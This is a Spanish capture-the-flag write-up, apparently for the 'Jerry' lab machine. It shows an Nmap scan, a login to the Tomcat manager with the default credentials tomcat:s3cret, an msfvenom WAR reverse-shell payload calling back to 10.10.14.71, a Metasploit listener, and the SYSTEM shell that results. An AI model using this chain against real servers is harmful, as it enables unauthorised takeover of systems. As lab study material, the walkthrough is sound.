>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/jerry]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.129.136.9
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-15 10:54 EST
Nmap scan report for 10.129.136.9
Host is up (0.058s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.58 seconds
```

>Vemos un **Apache Tomcat** así que probamos las credenciales por defecto y ganamos acceso al manager app: `tomcat:s3cret`

<img width="997" height="668" alt="image" src="https://github.com/user-attachments/assets/d79b953d-66aa-437c-9231-9370c9e8b09f" />

>Aquí, vamos a subir un **WAR file** que ejecute una **reverse shell** al visitarla:

<img width="1466" height="428" alt="image" src="https://github.com/user-attachments/assets/7b3113d6-1e5a-49d2-a424-2062ce88217b" />

>Creamos el **WAR** malicioso que ejecute una **reverse shell**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/jerry]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LPORT=8443 LHOST=10.10.14.71 -f war -o shell.war
Payload size: 1092 bytes
Final size of war file: 1092 bytes
Saved as: shell.war
```

>Ponemos en escucha un listener de metasploit:

```bash
msf exploit(multi/handler) > set PAYLOAD java/jsp_shell_reverse_tcp
PAYLOAD => java/jsp_shell_reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.14.71
LHOST => 10.10.14.71
msf exploit(multi/handler) > set LPORT 8443
LPORT => 8443
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.71:8443 
```

>Subimos el archivo **WAR** a la página y al **visitar el Deploy** recibimos una **shell** como **NT AUTHORITY\SYSTEM**:

```bash
[*] Command shell session 1 opened (10.10.14.71:8443 -> 10.129.136.9:49192) at 2026-01-15 11:08:23 -0500
Shell Banner:
Microsoft Windows [Version 6.3.9600]
-----
          
C:\apache-tomcat-7.0.88> whoami
whoami
nt authority\system
```
